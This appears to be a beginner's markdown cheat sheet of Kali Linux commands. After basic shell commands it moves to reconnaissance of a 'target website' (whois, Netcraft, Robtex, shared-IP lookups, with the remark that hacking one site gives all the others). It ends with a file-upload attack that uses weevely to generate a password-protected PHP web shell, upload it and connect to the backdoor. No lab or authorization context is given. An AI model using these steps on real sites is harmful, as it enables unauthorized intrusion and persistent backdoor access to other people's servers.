
# kali linux commands

- prints current working directry, uses to redirect to open a file - `pwd`  

- list all files - `ls`

- open a folder - `cd`

- previous folder - `..`  

- prints descrption of a function - `man`   

-  Delete a file `rm -rf` 

- used to update like (winget in windows) - `sudo apt-get update` 

- upgrade kali linux - `sudo apt upgrade` 

- update kali linux - `sudo apt update`  

<h3 align="center"> ... </h3>  

## check IP address


- to check the information of the target website  
```
http://whois.domaintools.com/
```
- to check which techonology is used in target website  
```
http://toolbar.netcraft.com/site_report?url=
```

- which which website have same ipaddress  

>if we can hack into 1 we can hack all the other

```
https://www.robtex.com/ 
```  
- Using bing.com, search for `ip: [target ip]`
- <h3 align="center"> ... </h3> 
## FileUploadVulnerability
- weevely is a tool used for opening the backdoors and to access the website.
```
weevely generate 123456 /root/shell.php
```
- this creates a php file which is used to upload and open backdoors
- after uploading, run the following command
- `weevely (respective url) 123456`
- now from the terminal we can open the backdoor that is  `cd ..` to get back and then we can access as we want.
- burpsuite is used to interpt the website being executed with the help of proxy.
